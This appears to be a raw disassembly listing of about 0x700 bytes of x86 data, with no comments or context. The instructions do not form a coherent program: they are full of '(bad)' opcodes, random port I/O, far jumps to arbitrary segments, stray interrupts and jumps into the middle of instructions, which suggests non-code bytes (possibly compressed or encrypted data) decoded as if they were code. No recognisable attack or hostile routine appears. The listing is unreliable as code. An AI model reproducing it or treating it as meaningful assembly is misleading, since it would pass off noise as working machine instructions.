  41f717:	fdiv   st(0),st
  41f719:	xchg   DWORD PTR [edi+esi*4+0x7e],esi
  41f71d:	mov    al,BYTE PTR [ebx-0x1013dc0b]
  41f723:	pushf  
  41f724:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f725:	cmp    esi,DWORD PTR [ebp-0x72]
  41f728:	sar    DWORD PTR [ebx-0x388244e3],cl
  41f72e:	add    DWORD PTR [ecx+0x31],0x88ff7f5
  41f735:	xor    esp,DWORD PTR [esi-0x727368bc]
  41f73b:	mov    BYTE PTR [ebx],dh
  41f73d:	rol    DWORD PTR [esi-0x60],0x13
  41f741:	fwait
  41f742:	daa    
  41f743:	(bad)  [edx-0x6149233d]
  41f749:	pop    ebx
  41f74a:	cdq    
  41f74b:	push   edi
  41f74c:	jg     0x41f745
  41f74e:	int3   
  41f74f:	xor    edi,DWORD PTR [ebx]
  41f751:	les    esp,FWORD PTR [esi-0x3e]
  41f754:	lods   eax,DWORD PTR ds:[esi]
  41f755:	adc    ebp,0xa56fbb56
  41f75b:	shl    BYTE PTR [esi],0x29
  41f75e:	ss or  al,0xc
  41f762:	addr16 loopne 0x41f761
  41f765:	sbb    ebp,0xc8b72b57
  41f76b:	in     eax,0x53
  41f76d:	xor    eax,0x49d82e48
  41f772:	and    WORD PTR [ecx-0x84fadc9],dx
  41f779:	push   edx
  41f77a:	ret    
  41f77b:	and    DWORD PTR [edx+esi*1+0xd1953ce],eax
  41f782:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f783:	mov    esi,0xfad9eb61
  41f788:	mov    eax,fs
  41f78a:	fbld   TBYTE PTR [esi]
  41f78c:	and    ecx,DWORD PTR [edi-0x574b7b87]
  41f792:	pop    ds
  41f793:	adc    BYTE PTR [esp+ecx*4],bh
  41f796:	sub    al,0xa1
  41f798:	repz jp 0x41f78d
  41f79b:	jo     0x41f7e1
  41f79d:	inc    eax
  41f79e:	mov    ah,0x28
  41f7a0:	outs   dx,DWORD PTR ds:[esi]
  41f7a1:	or     DWORD PTR [ebx+ebx*4+0x75],edi
  41f7a5:	mov    bh,0xd
  41f7a7:	inc    edx
  41f7a8:	inc    esp
  41f7a9:	sbb    dl,BYTE PTR [ecx-0x49]
  41f7ac:	jle    0x41f785
  41f7ae:	pushf  
  41f7af:	(bad)  
  41f7b0:	outs   dx,BYTE PTR ds:[esi]
  41f7b1:	aas    
  41f7b2:	xchg   DWORD PTR [ecx+0x39326fbe],edi
  41f7b8:	mov    esp,0xcdf85dd6
  41f7bd:	(bad)  
  41f7be:	ins    DWORD PTR es:[edi],dx
  41f7bf:	mov    esi,0x350767ae
  41f7c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7c5:	ret    0x7b2e
  41f7c8:	cld    
  41f7c9:	lock cdq 
  41f7cb:	aas    
  41f7cc:	(bad)  
  41f7cd:	push   eax
  41f7ce:	jg     0x41f76b
  41f7d0:	les    ebp,FWORD PTR [esi]
  41f7d2:	inc    ebp
  41f7d3:	sub    ah,BYTE PTR [ebx-0x70ab8ce3]
  41f7d9:	call   0x61369241
  41f7de:	pop    esi
  41f7df:	fwait
  41f7e0:	sbb    dh,BYTE PTR ds:0xc6a2daa
  41f7e6:	xor    eax,0x3e2d7e58
  41f7eb:	mov    ebx,0xdb582022
  41f7f0:	jnp    0x41f7da
  41f7f2:	fisubr WORD PTR ds:0x4af5d8c7
  41f7f8:	xchg   edi,eax
  41f7f9:	or     al,0xe9
  41f7fb:	xor    bl,al
  41f7fd:	push   cs
  41f7fe:	dec    ecx
  41f7ff:	mov    ebp,edi
  41f801:	mov    bl,0xd0
  41f803:	xor    eax,0x9f3cd78b
  41f808:	aaa    
  41f809:	lahf   
  41f80a:	cmp    eax,0x7e1f13f5
  41f80f:	jbe    0x41f804
  41f811:	retf   
  41f812:	jg     0x41f7ff
  41f814:	mov    ebp,esp
  41f816:	enter  0x74ab,0x7b
  41f81a:	push   ebp
  41f81b:	je     0x41f81d
  41f81d:	pop    ds
  41f81e:	jnp    0x41f806
  41f820:	cdq    
  41f821:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f822:	mov    ch,0xbe
  41f824:	pop    edi
  41f825:	push   edx
  41f826:	repnz cld 
  41f828:	mov    edi,0x47ab6055
  41f82d:	jle    0x41f899
  41f82f:	or     eax,0x96999bf0
  41f834:	shl    BYTE PTR [edi],cl
  41f836:	adc    dl,BYTE PTR [edx+eiz*2-0x78]
  41f83a:	xchg   ebp,eax
  41f83b:	pop    edi
  41f83c:	mov    ch,0x7e
  41f83e:	push   edx
  41f83f:	mov    ecx,DWORD PTR [ebx+0x30]
  41f842:	shl    DWORD PTR [ebp-0x327e9c18],0xa1
  41f849:	mov    dl,0xde
  41f84b:	scas   eax,DWORD PTR es:[edi]
  41f84c:	xchg   esp,eax
  41f84d:	mov    ch,0x3a
  41f84f:	aaa    
  41f850:	mov    al,0xa9
  41f852:	aam    0xe3
  41f854:	inc    esp
  41f855:	pop    ebp
  41f856:	daa    
  41f857:	push   edx
  41f858:	adc    DWORD PTR [edx+edi*2+0x3049b93d],esp
  41f85f:	test   esp,esp
  41f861:	(bad)  
  41f862:	outs   dx,DWORD PTR ds:[esi]
  41f863:	loop   0x41f88f
  41f865:	ret    0x48b8
  41f868:	lds    esi,FWORD PTR [edx]
  41f86a:	mov    BYTE PTR [edi+0x6e],ch
  41f86d:	mov    cl,0x65
  41f86f:	and    ebx,esp
  41f871:	int3   
  41f872:	push   DWORD PTR [ecx+0x75]
  41f875:	push   edx
  41f876:	mov    cl,0x94
  41f878:	xor    DWORD PTR [esi+0x4d],eax
  41f87b:	or     ecx,DWORD PTR [edi-0x14]
  41f87e:	ds (bad) 
  41f880:	pop    edi
  41f881:	mov    esi,0x54232ff2
  41f886:	ds cli 
  41f888:	cmc    
  41f889:	iret   
  41f88a:	jo     0x41f883
  41f88c:	imul   edi,edi,0x6
  41f88f:	xlat   BYTE PTR ds:[ebx]
  41f890:	(bad)  
  41f891:	push   ds
  41f892:	arpl   WORD PTR [eax],di
  41f894:	stc    
  41f895:	sub    BYTE PTR [ebx],bh
  41f897:	addr16 into 
  41f899:	jae    0x41f891
  41f89b:	les    eax,FWORD PTR [edx+0x7b82e59d]
  41f8a1:	ror    BYTE PTR [edx+0x6b],0x94
  41f8a5:	lods   al,BYTE PTR ds:[esi]
  41f8a6:	xor    al,0xf2
  41f8a8:	ins    BYTE PTR es:[edi],dx
  41f8a9:	inc    edi
  41f8aa:	aas    
  41f8ab:	inc    ebp
  41f8ac:	jge    0x41f868
  41f8ae:	jno    0x41f859
  41f8b0:	dec    edx
  41f8b1:	mov    DWORD PTR ds:0x8651639b,esp
  41f8b7:	jmp    0x56f9:0x98218bd5
  41f8be:	add    DWORD PTR [eax+0x6798f176],edx
  41f8c4:	inc    eax
  41f8c5:	dec    ebp
  41f8c6:	pop    es
  41f8c7:	push   eax
  41f8c8:	sub    al,0x1e
  41f8ca:	adc    esp,DWORD PTR ds:0x79eb2f3c
  41f8d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8d1:	pop    ds
  41f8d2:	xor    al,0x4a
  41f8d4:	jg     0x41f8c0
  41f8d6:	in     eax,0x50
  41f8d8:	addr16 sti 
  41f8da:	std    
  41f8db:	dec    BYTE PTR [ecx]
  41f8dd:	dec    ebp
  41f8de:	loopne 0x41f91f
  41f8e0:	outs   dx,DWORD PTR ds:[esi]
  41f8e1:	out    0xde,eax
  41f8e3:	pop    ebp
  41f8e4:	inc    esp
  41f8e5:	jmp    0x8771:0x4fda6254
  41f8ec:	shl    BYTE PTR [edx+0x62c8d417],1
  41f8f2:	and    al,0xf3
  41f8f4:	sub    dh,ch
  41f8f6:	cli    
  41f8f7:	mov    dh,al
  41f8f9:	cmp    al,0xfa
  41f8fb:	aam    0x1c
  41f8fd:	push   0x0
  41f8ff:	jno    0x41f8f6
  41f901:	int    0x3e
  41f903:	ss or  eax,0x31220901
  41f909:	mov    esi,0x81cfcb4f
  41f90e:	sub    DWORD PTR ds:0x73217660,ecx
  41f914:	mov    bh,0xdf
  41f916:	(bad)  
  41f917:	out    0x9b,eax
  41f919:	mov    ds:0x607b41b5,al
  41f91e:	mov    ebx,0xfb8353df
  41f923:	cmp    DWORD PTR [ebx-0x84bf2f7],eax
  41f929:	rcr    cl,1
  41f92b:	inc    ecx
  41f92c:	mov    eax,0x7befcfdd
  41f931:	aas    
  41f932:	push   ebx
  41f933:	xor    BYTE PTR [ebx],dl
  41f935:	mov    ebp,esi
  41f937:	and    al,0x83
  41f939:	psllw  mm2,QWORD PTR [edi]
  41f93c:	bound  edi,QWORD PTR [esi+ebx*4+0x77bff5f9]
  41f943:	xchg   BYTE PTR [edi],ch
  41f945:	in     eax,dx
  41f946:	jg     0x41f8d9
  41f948:	dec    ebx
  41f949:	(bad)  
  41f94b:	jno    0x41f97d
  41f94d:	fisub  WORD PTR [ebp-0x50]
  41f950:	arpl   WORD PTR [esi-0x5326ba9f],ax
  41f956:	test   eax,0xad95c6c3
  41f95b:	jno    0x41f942
  41f95d:	imul   edx,DWORD PTR [edx+0x54],0x46
  41f961:	lods   al,BYTE PTR ds:[esi]
  41f962:	push   cs
  41f963:	mov    WORD PTR [ebp-0x33],?
  41f966:	push   eax
  41f967:	(bad)  
  41f968:	lods   al,BYTE PTR ds:[esi]
  41f969:	jmp    0x70d1:0xc561e38a
  41f970:	enter  0x9ba0,0x60
  41f974:	jp     0x41f9f3
  41f976:	cmp    BYTE PTR [ebp+0x21],cl
  41f979:	push   ecx
  41f97a:	aam    0x57
  41f97c:	mov    cl,0x25
  41f97e:	dec    ecx
  41f97f:	mov    esi,0xf4772628
  41f984:	imul   ecx,DWORD PTR [ecx-0x29],0xe3b974f5
  41f98b:	in     al,dx
  41f98c:	pop    ebx
  41f98d:	pop    esi
  41f98e:	shr    BYTE PTR [edx-0x3ea81603],0x5c
  41f995:	out    dx,eax
  41f996:	mov    ebx,0xf00462bd
  41f99b:	inc    ecx
  41f99c:	nop
  41f99d:	(bad)  
  41f99e:	push   DWORD PTR [edi]
  41f9a0:	lahf   
  41f9a1:	mov    ebx,0x27afaa64
  41f9a6:	mul    DWORD PTR [edx]
  41f9a8:	xor    DWORD PTR [edx],ebp
  41f9aa:	leave  
  41f9ab:	dec    edx
  41f9ac:	in     al,dx
  41f9ad:	xchg   ecx,eax
  41f9ae:	das    
  41f9af:	add    DWORD PTR [ebx],esi
  41f9b1:	mov    bl,0x72
  41f9b3:	bound  edi,QWORD PTR [ecx+0x783c20e4]
  41f9b9:	xlat   BYTE PTR ds:[ebx]
  41f9ba:	or     esi,DWORD PTR [edi+0x57]
  41f9bd:	test   DWORD PTR [eax],0x2c9f8f89
  41f9c3:	sub    dh,BYTE PTR [edx]
  41f9c5:	adc    BYTE PTR [edi+0x47917c4e],0x1d
  41f9cc:	pusha  
  41f9cd:	fsubr  DWORD PTR [edi+0x1e84ec70]
  41f9d3:	popf   
  41f9d4:	ret    0x3dd2
  41f9d7:	enter  0x2f9b,0xbf
  41f9db:	sahf   
  41f9dc:	mov    ebp,0x799f34fe
  41f9e1:	jmp    0x21a523dd
  41f9e6:	(bad)  
  41f9e7:	jmp    0x9462:0xac9d094b
  41f9ee:	push   edx
  41f9ef:	enter  0x90bd,0xb4
  41f9f3:	pop    es
  41f9f4:	test   eax,0x9ef60c4e
  41f9f9:	(bad)  
  41f9fa:	mov    ecx,0x59a3d2fc
  41f9ff:	add    eax,0x799216b4
  41fa04:	sbb    eax,0x7fe73de1
  41fa09:	adc    bl,0xfd
  41fa0c:	or     esi,edi
  41fa0e:	loope  0x41fa1b
  41fa10:	mov    edi,0x6febc9c0
  41fa15:	in     al,0x70
  41fa17:	clc    
  41fa18:	xlat   BYTE PTR ds:[ebx]
  41fa19:	rcl    BYTE PTR [ebx-0x71],1
  41fa1c:	mov    al,0x77
  41fa1e:	test   BYTE PTR [ebx+edi*4],0x8b
  41fa22:	mov    ss,WORD PTR [ebx-0x33e789d9]
  41fa28:	cmp    BYTE PTR [esi],ch
  41fa2a:	(bad)  
  41fa2b:	and    BYTE PTR [ecx+0x57993b62],dh
  41fa31:	or     esp,edx
  41fa33:	sub    BYTE PTR [ecx-0x38],cl
  41fa36:	sbb    BYTE PTR [edx+0x13],bl
  41fa39:	cmp    DWORD PTR [eax+esi*8-0x17eef3b7],esi
  41fa40:	inc    esp
  41fa41:	data16 aas 
  41fa43:	sub    BYTE PTR [ecx-0x3454f45c],ah
  41fa49:	js     0x41fa6f
  41fa4b:	outs   dx,BYTE PTR ds:[esi]
  41fa4c:	xor    esi,ebx
  41fa4e:	xor    edx,DWORD PTR [esi]
  41fa50:	shl    DWORD PTR [ebp-0x1e],cl
  41fa53:	icebp  
  41fa54:	fisub  DWORD PTR [edx-0x3e73efa1]
  41fa5a:	mov    edx,0x96f9444b
  41fa5f:	and    edi,DWORD PTR [ebx+0x73]
  41fa62:	dec    ebx
  41fa63:	inc    ebx
  41fa64:	rol    BYTE PTR [esi-0x2c595f58],0x48
  41fa6b:	xor    eax,0x1203a8d1
  41fa70:	imul   edi,DWORD PTR [edx+eax*4+0x40256f3f],0xb
  41fa78:	(bad)  
  41fa7a:	fidiv  DWORD PTR [edi+0x4c]
  41fa7d:	popf   
  41fa7e:	test   eax,0x403cde4f
  41fa83:	xchg   ecx,eax
  41fa84:	in     al,0xe4
  41fa86:	cs pop esi
  41fa88:	cdq    
  41fa89:	cdq    
  41fa8a:	xchg   BYTE PTR [esp+esi*4-0x38],bh
  41fa8e:	outs   dx,DWORD PTR ds:[esi]
  41fa8f:	mov    ds,WORD PTR [esi]
  41fa91:	aam    0x5a
  41fa93:	test   DWORD PTR [esi-0x753ea37b],ebp
  41fa99:	jmp    0x41facd
  41fa9b:	xor    BYTE PTR [eax-0x6def2cd6],dl
  41faa1:	test   eax,0x21170801
  41faa6:	mov    ch,0xfb
  41faa8:	push   ebx
  41faa9:	sbb    al,0x27
  41faab:	imul   eax,DWORD PTR [ecx],0xffffffc2
  41faae:	(bad)  
  41fab0:	fs mov dl,dl
  41fab3:	xchg   ebx,eax
  41fab4:	les    ebp,FWORD PTR [edx+0x42]
  41fab7:	out    dx,eax
  41fab8:	adc    ah,BYTE PTR [ebp-0x1a5c473b]
  41fabe:	div    BYTE PTR [eax]
  41fac0:	and    eax,DWORD PTR [ecx+0x5442a42d]
  41fac6:	pop    ss
  41fac7:	ins    BYTE PTR es:[edi],dx
  41fac8:	or     ecx,ecx
  41faca:	pusha  
  41facb:	shr    BYTE PTR [edi],1
  41facd:	pop    ss
  41face:	in     al,dx
  41facf:	sahf   
  41fad0:	fsubr  st(5),st
  41fad2:	in     eax,0x8f
  41fad4:	rcr    DWORD PTR [ebp+0x5bc6de67],0xfe
  41fadb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fadc:	xor    DWORD PTR [ebp+0x25d29c0d],0xb63ef5ab
  41fae6:	sbb    ecx,ebp
  41fae8:	mov    edx,0x9642323d
  41faed:	sahf   
  41faee:	add    ebp,eax
  41faf0:	jmp    0x7019:0x76b3719a
  41faf7:	jne    0x41fa9e
  41faf9:	jmp    0x41faa3
  41fafb:	sbb    ecx,DWORD PTR [esi+0x460a63c7]
  41fb01:	daa    
  41fb02:	cdq    
  41fb03:	sub    dl,BYTE PTR ds:0xac60a3a1
  41fb09:	xchg   ebx,eax
  41fb0a:	ret    0xa908
  41fb0d:	sbb    dl,bl
  41fb0f:	cmp    DWORD PTR [ebx-0x25],eax
  41fb12:	mov    bl,0x80
  41fb14:	push   esp
  41fb15:	sub    BYTE PTR [esi],dh
  41fb17:	xchg   edx,eax
  41fb18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb19:	out    0xc2,eax
  41fb1b:	ja     0x41fb79
  41fb1d:	jecxz  0x41fb79
  41fb1f:	pop    edi
  41fb20:	lahf   
  41fb21:	cli    
  41fb22:	hlt    
  41fb23:	xchg   DWORD PTR [edi],edi
  41fb25:	cmc    
  41fb26:	sbb    bh,dh
  41fb28:	into   
  41fb29:	movq   mm1,mm7
  41fb2c:	xchg   ebp,eax
  41fb2d:	fisubr DWORD PTR [ebp-0x45]
  41fb30:	mov    ebp,0x85f00762
  41fb35:	(bad)  
  41fb36:	jl     0x41fb7c
  41fb38:	outs   dx,BYTE PTR ds:[esi]
  41fb39:	jl     0x41fb28
  41fb3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb3c:	out    dx,eax
  41fb3d:	ins    DWORD PTR es:[edi],dx
  41fb3e:	sub    eax,0x95ec12ee
  41fb43:	inc    esi
  41fb44:	into   
  41fb45:	xlat   BYTE PTR ds:[ebx]
  41fb46:	test   BYTE PTR [esi],ah
  41fb48:	jns    0x41fba3
  41fb4a:	inc    eax
  41fb4b:	mov    edx,0xa7f7da29
  41fb50:	adc    ch,BYTE PTR [ebx+0x176784a1]
  41fb56:	nop
  41fb57:	and    BYTE PTR [eax],0xd4
  41fb5a:	or     bh,BYTE PTR [ecx]
  41fb5c:	cmp    edx,DWORD PTR [ebp+ebx*1-0x755c79af]
  41fb63:	sbb    eax,0xbb9ea9a6
  41fb68:	ja     0x41fbcc
  41fb6a:	pop    DWORD PTR [ebp+0x2f]
  41fb6d:	mov    esp,0xdc93dcfe
  41fb72:	sub    esi,edi
  41fb74:	js     0x41fb6c
  41fb76:	out    dx,al
  41fb77:	aaa    
  41fb78:	clc    
  41fb79:	loope  0x41fb22
  41fb7b:	faddp  st(3),st
  41fb7d:	outs   dx,DWORD PTR ds:[esi]
  41fb7e:	mov    ebp,0x878e19f0
  41fb83:	arpl   WORD PTR [edx-0x71],bx
  41fb86:	popf   
  41fb87:	stos   BYTE PTR es:[edi],al
  41fb88:	mov    dl,0x9b
  41fb8a:	dec    esi
  41fb8b:	lock cli 
  41fb8d:	xchg   DWORD PTR [esi-0xde34f1c],ebx
  41fb93:	cld    
  41fb94:	ror    DWORD PTR [ebx+0x58],0xcd
  41fb98:	ds stos BYTE PTR es:[edi],al
  41fb9a:	dec    ebx
  41fb9b:	xor    ebx,DWORD PTR [ebp-0x3a]
  41fb9e:	cmc    
  41fb9f:	add    ebx,DWORD PTR [ebp+0x34]
  41fba2:	mov    ecx,0x499f65b
  41fba7:	inc    ebp
  41fba8:	js     0x41fba1
  41fbaa:	stc    
  41fbab:	out    dx,eax
  41fbac:	in     eax,0x85
  41fbae:	cmc    
  41fbaf:	mov    ebx,esp
  41fbb1:	stc    
  41fbb2:	pop    edx
  41fbb3:	iret   
  41fbb4:	out    0xc6,al
  41fbb6:	pop    edi
  41fbb7:	out    0x60,al
  41fbb9:	stc    
  41fbba:	xor    ch,dh
  41fbbc:	aam    0x23
  41fbbe:	pushf  
  41fbbf:	aas    
  41fbc0:	jge    0x41fb54
  41fbc2:	sar    DWORD PTR [ebx+0x3894864b],cl
  41fbc8:	sbb    al,0x2b
  41fbca:	(bad)  
  41fbcb:	js     0x41fc17
  41fbcd:	xchg   ecx,eax
  41fbce:	mov    bl,0xaf
  41fbd0:	std    
  41fbd1:	retf   0xb9e6
  41fbd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbd5:	adc    BYTE PTR [eax],dl
  41fbd7:	pop    ebx
  41fbd8:	and    BYTE PTR [ecx+0x36490a3a],cl
  41fbde:	int    0xed
  41fbe0:	mov    bh,0x16
  41fbe2:	mov    ebp,0x8ec68812
  41fbe7:	cmp    eax,0xeb5b5e84
  41fbec:	lods   al,BYTE PTR ds:[esi]
  41fbed:	mov    ebx,DWORD PTR [esi+0x4b723c4c]
  41fbf3:	jb     0x41fb9c
  41fbf5:	xor    BYTE PTR [ebx+ecx*4-0x390f7986],0x56
  41fbfd:	hlt    
  41fbfe:	les    edi,FWORD PTR [ecx]
  41fc00:	or     ecx,DWORD PTR [edi+0xf]
  41fc03:	fdivr  QWORD PTR [eax]
  41fc05:	mov    al,BYTE PTR [ebp+0x1a]
  41fc08:	mov    eax,ds:0xfd455691
  41fc0d:	iret   
  41fc0e:	retf   
  41fc0f:	mov    eax,ds:0xc5aae06d
  41fc14:	jmp    0x41fc4d
  41fc16:	sbb    dh,ch
  41fc18:	push   es
  41fc19:	imul   ebx,eax,0xffffffd4
  41fc1c:	scas   eax,DWORD PTR es:[edi]
  41fc1d:	fisttp WORD PTR [esp+esi*2]
  41fc20:	cs jmp 0x36c40c8f
  41fc26:	jge    0x41fbc6
  41fc28:	xchg   esi,eax
  41fc29:	or     ch,BYTE PTR [eax-0x7d]
  41fc2c:	fldenv [ecx+0x45]
  41fc2f:	repz xchg esp,eax
  41fc31:	pop    ds
  41fc32:	aas    
  41fc33:	test   DWORD PTR [ebp-0x1e],0xa6de67eb
  41fc3a:	mov    dl,0xe2
  41fc3c:	pop    esp
  41fc3d:	mov    ?,ebx
  41fc3f:	jge    0x41fbc3
  41fc41:	in     eax,dx
  41fc42:	ds mov ch,0x20
  41fc45:	inc    eax
  41fc46:	int    0x75
  41fc48:	hlt    
  41fc49:	xchg   ebx,eax
  41fc4a:	pop    ebx
  41fc4b:	stos   BYTE PTR es:[edi],al
  41fc4c:	xor    al,0x8b
  41fc4e:	popf   
  41fc4f:	mov    es,WORD PTR [ebx]
  41fc51:	or     eax,0x293ab42d
  41fc56:	pop    ebx
  41fc57:	call   0x725fee1a
  41fc5c:	jg     0x41fc52
  41fc5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc5f:	icebp  
  41fc60:	adc    ebp,ebp
  41fc62:	in     eax,0x1c
  41fc64:	mov    dl,0x30
  41fc66:	ins    BYTE PTR es:[edi],dx
  41fc67:	xchg   esp,eax
  41fc68:	cmc    
  41fc69:	icebp  
  41fc6a:	enter  0xb99,0xa7
  41fc6e:	pop    ecx
  41fc6f:	scas   eax,DWORD PTR es:[edi]
  41fc70:	inc    esi
  41fc71:	dec    esi
  41fc72:	out    dx,al
  41fc73:	gs ds jnp 0x41fc6f
  41fc77:	imul   ebp,DWORD PTR [esi],0xe6e31d77
  41fc7d:	cwde   
  41fc7e:	int    0x66
  41fc80:	lds    ebp,FWORD PTR [ecx-0xa]
  41fc83:	pop    eax
  41fc84:	loop   0x41fca1
  41fc86:	pushf  
  41fc87:	dec    edx
  41fc88:	js     0x41fce6
  41fc8a:	test   eax,0x57c1d315
  41fc8f:	mov    eax,0x614a1865
  41fc94:	push   ebx
  41fc95:	aaa    
  41fc96:	push   esp
  41fc97:	push   ebx
  41fc98:	pop    edi
  41fc99:	je     0x41fc1e
  41fc9b:	shr    BYTE PTR [ebx-0x6882d760],1
  41fca1:	pop    ecx
  41fca2:	stos   BYTE PTR es:[edi],al
  41fca3:	xor    bh,BYTE PTR [edx+0x42d51020]
  41fca9:	addr16 push es
  41fcab:	cmp    DWORD PTR [ecx-0x53],edx
  41fcae:	inc    ebx
  41fcaf:	xor    al,0x91
  41fcb1:	and    al,0x53
  41fcb3:	mov    edx,0xb37cb901
  41fcb8:	pop    ebx
  41fcb9:	pop    edi
  41fcba:	out    dx,eax
  41fcbb:	jle    0x41fcd9
  41fcbd:	js     0x41fc94
  41fcbf:	sbb    al,0xc0
  41fcc1:	sub    ecx,DWORD PTR [edx+0x1]
  41fcc4:	scas   al,BYTE PTR es:[edi]
  41fcc5:	pop    esi
  41fcc6:	mov    ecx,0x74bc6f22
  41fccb:	dec    ecx
  41fccc:	(bad)  
  41fccd:	mov    cl,0xbc
  41fccf:	das    
  41fcd0:	mov    DWORD PTR [ebx+0x7f],ecx
  41fcd3:	dec    ecx
  41fcd4:	or     eax,0x2aac55b2
  41fcd9:	ins    DWORD PTR es:[edi],dx
  41fcda:	xchg   esp,eax
  41fcdb:	xchg   esp,eax
  41fcdc:	(bad)  
  41fcdd:	ret    0xfae1
  41fce0:	enter  0x8c63,0x29
  41fce4:	xchg   esi,eax
  41fce5:	or     eax,0x46488293
  41fcea:	inc    esp
  41fceb:	dec    ecx
  41fcec:	test   eax,0x68a7b80b
  41fcf1:	scas   eax,DWORD PTR es:[edi]
  41fcf2:	aam    0x9c
  41fcf4:	test   eax,0xd38dd01b
  41fcf9:	jle    0x41fc83
  41fcfb:	sbb    BYTE PTR [eax+0x0],bh
  41fcfe:	add    BYTE PTR [eax],ah
  41fd00:	add    BYTE PTR [ecx+0x44],cl
  41fd03:	inc    ecx
  41fd04:	push   esp
  41fd05:	ror    BYTE PTR [ecx+0x32],1
  41fd08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd09:	dec    edi
  41fd0a:	pushf  
  41fd0b:	loop   0x41fd0a
  41fd0d:	dec    edi
  41fd0e:	mov    edi,0xf47c1f97
  41fd13:	jnp    0x41fccd
  41fd15:	jp     0x41fd01
  41fd17:	or     dh,BYTE PTR [edi]
  41fd19:	aas    
  41fd1a:	mov    dh,0xc7
  41fd1c:	cli    
  41fd1d:	and    esp,edi
  41fd1f:	clc    
  41fd20:	in     al,0xef
  41fd22:	(bad)  
  41fd23:	push   ds
  41fd24:	out    dx,eax
  41fd25:	jp     0x41fd13
  41fd27:	pop    ebp
  41fd28:	cld    
  41fd29:	clc    
  41fd2a:	jmp    0x41fdab
  41fd2c:	test   BYTE PTR [edi-0x41],ch
  41fd2f:	hlt    
  41fd30:	sbb    dl,BYTE PTR [edx]
  41fd32:	ret    0xc589
  41fd35:	outs   dx,DWORD PTR cs:[esi]
  41fd37:	mov    ebp,0xd60e66fa
  41fd3c:	sti    
  41fd3d:	pushf  
  41fd3e:	jmp    0x11fe:0x9e67f24e
  41fd45:	dec    esi
  41fd46:	sub    eax,0x3273ba4f
  41fd4b:	outs   dx,DWORD PTR ds:[esi]
  41fd4c:	cmovle ebx,ecx
  41fd4f:	sbb    ebp,ebx
  41fd51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd53:	pop    eax
  41fd54:	xor    cl,BYTE PTR [edx]
  41fd56:	out    dx,eax
  41fd57:	jns    0x41fd41
  41fd59:	pop    es
  41fd5a:	js     0x41fdcd
  41fd5c:	jge    0x41fceb
  41fd5e:	imul   ebx,DWORD PTR [edi-0x68026785],0x7e
  41fd65:	mov    cl,ch
  41fd67:	out    dx,al
  41fd68:	mov    bh,0xd1
  41fd6a:	pop    edi
  41fd6b:	js     0x41fcff
  41fd6d:	mov    bl,0xa7
  41fd6f:	idiv   DWORD PTR [eax]
  41fd71:	mov    ebx,0x9b1c3b7
  41fd76:	inc    edi
  41fd77:	aad    0xb8
  41fd79:	pop    ss
  41fd7a:	dec    esp
  41fd7b:	mov    eax,0x98b29e2a
  41fd80:	xlat   BYTE PTR ds:[ebx]
  41fd81:	loopne 0x41fd30
  41fd83:	sub    dh,BYTE PTR ds:0x9357d60
  41fd89:	js     0x41fd3a
  41fd8b:	push   ecx
  41fd8c:	and    eax,0xc6a0d4f0
  41fd91:	repz dec edx
  41fd93:	inc    eax
  41fd94:	ja     0x41fdf5
  41fd96:	inc    ebp
  41fd97:	mov    WORD PTR gs:[edx-0x74],gs
  41fd9b:	push   ebp
  41fd9c:	sub    DWORD PTR ds:0xddf2f506,edx
  41fda2:	sbb    BYTE PTR [edx+eiz*8-0x6aac9ea8],ah
  41fda9:	mov    cl,0xf8
  41fdab:	jge    0x41fe10
  41fdad:	cmc    
  41fdae:	jl     0x41fe22
  41fdb0:	push   eax
  41fdb1:	pop    ss
  41fdb2:	xor    eax,0xb1c27555
  41fdb7:	push   0x914d1da4
  41fdbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdbd:	adc    ebp,esi
  41fdbf:	imul   ebp,DWORD PTR [ebx-0x45],0xd
  41fdc3:	in     eax,0x5f
  41fdc5:	jne    0x41fd72
  41fdc7:	xchg   ebp,eax
  41fdc8:	push   0xffffffd3
  41fdca:	inc    ebp
  41fdcb:	pusha  
  41fdcc:	inc    ecx
  41fdcd:	loop   0x41fdf4
  41fdcf:	mov    esp,0x185a9032
  41fdd4:	pushf  
  41fdd5:	or     BYTE PTR [esi],bh
  41fdd7:	shr    DWORD PTR [edx+0x53],0xed
  41fddb:	or     cl,cl
  41fddd:	mov    dh,0xc6
  41fddf:	xchg   edx,eax
  41fde0:	fcomp  DWORD PTR [esi*1+0x14d0d35b]
  41fde7:	icebp  
  41fde8:	int    0x4b
  41fdea:	mov    bl,dl
  41fdec:	mov    eax,0xb35f9b6f
  41fdf1:	cmp    eax,0x561c7274
  41fdf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdf7:	je     0x41fda6
  41fdf9:	inc    ebp
  41fdfa:	jmp    0xa022e8a8
  41fdff:	xor    cl,al
  41fe01:	aam    0x39
  41fe03:	outs   dx,DWORD PTR gs:[esi]
  41fe05:	xlat   BYTE PTR ds:[ebx]
  41fe06:	int    0x7d
  41fe08:	sub    eax,0xa67816c1
  41fe0d:	inc    ebp
  41fe0e:	je     0x41fd93
  41fe10:	dec    ecx
  41fe11:	cmp    bh,BYTE PTR [ecx+edi*1]
  41fe14:	and    al,0x9b
  41fe16:	push   ebx
  41fe17:	or     DWORD PTR [ecx+0x6d],0x38
  41fe1b:	mov    ebx,0xe0ca3006
  41fe20:	add    eax,DWORD PTR [edi-0x36]
  41fe23:	cmp    dl,dh
  41fe25:	sahf   
  41fe26:	mov    edi,0x6f4371d6
  41fe2b:	shr    DWORD PTR [ecx+0x66],cl
  41fe2e:	mov    ch,0xd9
  41fe30:	daa    
  41fe31:	push   ebp
  41fe32:	pop    eax
  41fe33:	cs dec esi
  41fe35:	xchg   edx,eax
  41fe36:	mov    edx,0x3959162e
  41fe3b:	lods   al,BYTE PTR ds:[esi]
  41fe3c:	jae    0x41fe63
  41fe3e:	pusha  
  41fe3f:	ret    
